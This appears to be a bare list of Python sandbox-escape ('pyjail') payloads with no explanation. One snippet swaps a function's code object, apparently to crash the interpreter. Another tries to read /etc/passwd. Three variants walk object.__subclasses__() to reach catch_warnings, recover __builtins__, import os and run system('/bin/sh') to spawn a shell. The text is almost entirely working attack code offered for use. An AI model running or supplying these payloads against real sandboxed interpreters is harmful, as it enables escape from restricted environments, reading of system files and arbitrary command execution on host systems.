fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi.gi_code
fn()
```

```
fp = open('/etc/passwd')
fn = lambda: None
fn.__code__ = fp.read
fn()
```

```
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('/bin/sh')
```

```
[x for x in ().__class__.mro()[1].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('/bin/sh')
```

```
[x for x in ().__class__.mro()[2].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('/bin/sh')
```

``
